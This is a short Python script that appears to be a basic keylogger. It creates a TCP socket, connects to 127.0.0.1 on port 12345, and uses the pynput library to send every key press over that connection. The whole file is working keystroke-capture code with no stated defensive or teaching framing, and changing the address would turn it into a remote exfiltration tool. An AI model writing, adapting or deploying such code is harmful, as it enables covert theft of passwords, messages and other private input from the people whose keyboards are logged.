import socket
from pynput import keyboard # used to obtain keyboard presses
try:
    s=socket.socket()
    print("Socket is successfully created! \n")

except socket.error as msg:
    print("Error! "+ str(msg))

try:
    s.connect(("127.0.0.1",12345))
    print("Connected!\n")
except socket.error as msg:
    print("Error! "+ str(msg))
    
listener=keyboard.Listener(on_press=lambda key:s.send(str(key).encode()))
listener.start()
input()


